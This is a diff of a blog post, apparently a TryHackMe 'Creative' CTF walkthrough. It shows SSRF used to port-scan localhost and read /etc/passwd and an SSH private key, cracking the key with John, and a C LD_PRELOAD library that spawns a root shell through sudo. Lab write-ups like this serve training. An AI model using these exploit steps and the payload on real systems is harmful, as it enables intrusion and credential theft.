@@ -11,13 +11,17 @@ image:
   path: /assets/img/2025-07-11-TryHackMe-Creative/main.webp
 ---
 
-Hi I'm making [TryHackMe Creative](https://tryhackme.com/room/creative) room.
+Hey everyone! Welcome to another adventure in the land of TryHackMe. Today, we're diving headfirst into the [Creative](https://tryhackme.com/room/creative) room. Let's pop open a terminal, get our IP, and see what kind of creative trouble we can get into.
 
----
+First things first, let's set our target IP as an environment variable so we don't have to type it out a million times. Efficiency is key!
 
 ```bash
 export IP=10.10.86.65
 ```
+
+## Step 1: Reconnaissance - The Nmap Ritual
+
+No hack starts without a proper Nmap scan. Let's knock on the server's doors and see who's home. We'll use a comprehensive scan to check all ports, run default scripts, and try to version-check the services.
 
 ```bash
 ❯ nmap -T4 -n -sC -sV -Pn -p- $IP
@@ -40,13 +44,20 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 132.32 seconds
 ```
 
-Lets visit the website.
 
-Firstly lets add creative.thm to `/etc/hosts`
+## Step 2: Web Exploration and Subdomain Hunting
+
+To visit `http://creative.thm`, we need to tell our machine how to find it. We'll edit our `/etc/hosts` file to point the domain name to the target IP address.
+
+```bash
+echo "$IP creative.thm" | sudo tee -a /etc/hosts
+```
+
+Now, let's fire up the browser.
 
 ![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo1.webp){: width="972" height="589" }
 
-Lets firstly fuzz the website using `gobuster`.
+It's a pretty standard-looking business website. Before we get lost clicking around, let's run a `gobuster` scan to look for hidden directories and files.
 
 ```bash
 ❯ gobuster dir -w common.txt -u http://creative.thm/ -x md,js,html,php,py,css,txt,bak -t 50
@@ -74,9 +85,9 @@ Finished
 ===============================================================
 ```
 
-Nothing crazy.
+The directory scan didn't give us much to work with. But what about subdomains? Websites often have development or staging sites on subdomains that can be less secure. Let's use `ffuf` to find them.
 
-Lets try finding subdomains.
+The key here is the `-H "Host: FUZZ.creative.thm"` header. This tells `ffuf` to replace `FUZZ` with each word from our list, effectively checking for `subdomain1.creative.thm`, `subdomain2.creative.thm`, and so on.
 
 ```bash
 ❯ ffuf -w top_subdomains.txt -u http://creative.thm/ -H "Host:FUZZ.creative.thm" -fw 6 -t 50
@@ -107,17 +118,19 @@ beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration:
 :: Progress: [114441/114441] :: Job [1/1] :: 688 req/sec :: Duration: [0:02:56] :: Errors: 0 ::
 ```
 
-Lets add beta.creative.thm to the `/etc/hosts` and go tho the website.
+Bingo! We found `beta.creative.thm`. Let's add that to our `/etc/hosts` file and see what's there.
 
 ![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo2.webp){: width="972" height="589" }
 
-Lets open a python webserver to test this.
+This page has a URL input field. It smells like **Server-Side Request Forgery (SSRF)**. The server is likely taking our URL, fetching the content from that URL, and then displaying it back to us. We can test this by pointing it to a webserver we control.
 
+Let's start a quick Python webserver on our machine.
 ![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo3.webp){: width="972" height="589" }
 
+And then give our IP to the form.
 ![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo4.webp){: width="972" height="589" }
 
-So it directly gets the `/` endpoint. We can use this to make ssrf. Lets try getting all localhost services. Using this `ffuf` command.
+Success! The target server made a GET request to our Python server. This confirms the SSRF vulnerability. We can now use the server as a proxy to scan its own internal network (`127.0.0.1`). Let's use `ffuf` again to scan all 65,535 ports on its localhost.
 
 ```bash
 ❯ ffuf -w <(seq 1 65535) -u 'http://beta.creative.thm/' -d "url=http://127.0.0.1:FUZZ/" -H 'Content-Type: application/x-www-form-urlencoded' -mc all -t 100 -fs 13
@@ -149,44 +162,50 @@ ________________________________________________
 1337                    [Status: 200, Size: 1188, Words: 41, Lines: 40, Duration: 244ms]
 ```
 
-We can see that localhost:1337 is open in that machine.
-
-So to that manually.
+Look at that! Port `1337` is open internally. Let's see what's running on it by manually submitting `http://127.0.0.1:1337` to the form.
 
 ![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo5.webp){: width="972" height="589" }
 ![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo6.webp){: width="972" height="589" }
 
-Its giving directory listing for / but if I click any of that directories I get 404. So we need to manually write the endpoint like /etc/passwd
+It's a simple file server that allows directory listing! However, it seems we can only access the root (`/`). If we try to append a path, like `/etc/`, it can read the contents. This means we can read any file on the system!
+
+Let's grab `/etc/passwd` to find a username.
+![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo7.webp){: width="972" height="589" }
 
 ```text
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin saad:x:1000:1000:saad:/home/saad:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
 ```
 
-Which gave me output.
+We found a user named `saad`. If there's a user, there might be an SSH key. Let's try to grab it from the default location: `/home/saad/.ssh/id_rsa`.
 
-Now try looking for any ssh keys.
+Jackpot! We have Saad's private SSH key.
 
-If you go to `http://127.0.0.1:1337/home/saad/.ssh/id_rsa`
+## Step 3: Cracking the Key and Getting a Shell
 
-You can get ssh private key for saad.
+Let's save the key, give it the correct permissions, and try to log in.
 
 ```bash
+# Save the key to a file named saad.key
 ❯ nvim saad.key
+# SSH requires private keys to have strict permissions
 ❯ chmod 400 saad.key
+# Let's try to log in!
 ❯ ssh saad@$IP -i saad.key
 Enter passphrase for key 'saad.key':
 ```
 
-Now we need to crack the ssh key password using `john`
+Drat! The key is protected by a passphrase. But fear not, this is what password cracking tools are for. We'll use the `ssh2john.py` script to convert the key into a hash format that John the Ripper can understand.
 
 ```bash
+# Convert the SSH key to a crackable hash
 python2 ssh2john.py saad.key > saad_ssh.hash
 ```
 
+Now, we unleash John on the hash using the famous `rockyou.txt` wordlist.
+
 ```bash
+# Time to crack this thing open.
 ❯ john hashes/ssh.hash --wordlist=rockyou.txt
-Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
-Use the "--format=ssh-opencl" option to force loading these as that type instead
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
@@ -197,7 +216,7 @@ finding a possible candidate.
 Press 'q' or Ctrl-C to abort, almost any other key for status
 ```
 
-Which gave the password to log in.
+After a short wait, John hands us the password on a silver platter. Now we can finally log in and grab the user flag!
 
 ```bash
 saad@ip-10-10-86-65:~$ ls
@@ -205,6 +224,10 @@ snap  start_server.py  user.txt
 saad@ip-10-10-86-65:~$ cat user.txt
 *********************************
 ```
+
+## Step 4: Privilege Escalation - The Road to Root
+
+We have a user shell, but the journey isn't over. We need to become `root`. Let's start by looking around Saad's home directory.
 
 ```bash
 saad@ip-10-10-86-65:~$ ls -la
@@ -225,7 +248,7 @@ drwx------ 2 saad saad 4096 Jan 21  2023 .ssh
 -rw-rw---- 1 saad saad   33 Jan 21  2023 user.txt
 ```
 
-bash history is not symlinked to /dev/null what
+Wait a minute... `.bash_history` exists? Some admins symlink it to `/dev/null` to prevent leaving traces. Let's see what our friend Saad has been up to.
 
 ```bash
 saad@ip-10-10-86-65:~$ cat .bash_history
@@ -241,9 +264,7 @@ nano .bashrc
 ls -al
 ```
 
-We can see that bro forgot to remove the bash history.
-
-Lets sudo -l
+While there's some juicy info here, let's see what `sudo` rights we have. This is often the fastest path to root.
 
 ```bash
 saad@ip-10-10-86-65:~$ sudo -l
@@ -257,33 +278,35 @@ User saad may run the following commands on ip-10-10-86-65:
     (root) /usr/bin/ping
 ```
 
-env_keep+=LD_PRELOAD we can use this to priv escalate
+This is it! `env_keep+=LD_PRELOAD` is a classic, well-known vulnerability. `LD_PRELOAD` is an environment variable that tells the system to load a specific library before any others. Because `sudo` is configured to *keep* this variable, we can create a malicious library, put our root-spawning code in it, and have `ping` (which we can run as root) load it for us. Game over.
 
-Look at this articles:
-
-[Linux Privilege Escalation using LD_Preload](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
-
-[LD_PRELOAD and Dynamic Library Hijacking in Linux | by Hem Parekh | Medium](https://medium.com/@hemparekh1596/ld-preload-and-dynamic-library-hijacking-in-linux-237943abb8e0)
+Let's craft our malicious C payload. This code will run as soon as the library is loaded, granting us a root shell.
 
 ```bash
+# Let's move to a directory where we can write files
 saad@ip-10-10-86-65:/tmp$ vim shell.c
 ```
 
-Add these lines:
+Here's the code to put in `shell.c`:
 
 ```c
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
+
+/* This function is called when the library is loaded */
 void _init() {
-unsetenv("LD_PRELOAD");
-setgid(0);
-setuid(0);
-system("/bin/sh");
+    unsetenv("LD_PRELOAD"); // Clean up after ourselves
+    setgid(0);              // Set our Group ID to root
+    setuid(0);              // Set our User ID to root
+    system("/bin/sh");      // Spawn a shell. As root!
 }
 ```
 
+Now, we compile this code into a shared object (`.so`) file.
+
 ```bash
+# Compile our C code into a shared library.
 saad@ip-10-10-86-65:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 shell.c: In function ‘_init’:
 shell.c:6:1: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
@@ -295,17 +318,27 @@ shell.c:7:1: warning: implicit declaration of function ‘setuid’ [-Wimplicit-
 saad@ip-10-10-86-65:/tmp$ ls -la shell.so
 total 68
 -rwxrwxr-x  1 saad saad 14760 Jul 11 12:19 shell.so
+```
+
+The moment of truth. We'll run `ping` with `sudo`, but first, we'll set the `LD_PRELOAD` variable to point to our shiny new `shell.so`.
+
+```bash
+# The final command. This preloads our library and runs ping as root.
 saad@ip-10-10-86-65:/tmp$ sudo LD_PRELOAD=/tmp/shell.so ping
+# Our shell spawns immediately. Let's check who we are.
 whoami
 root
 ```
 
-And we are root:
+We are root! The box is officially conquered. Let's grab our trophy.
 
 ```bash
+# Victory lap!
 # cd /root
 # ls
 root.txt  snap
 # cat root.txt
 *****************************
 ```
+
+And that's a wrap! The "Creative" room was a fantastic journey through SSRF and a classic `LD_PRELOAD` privilege escalation. Thanks for reading!
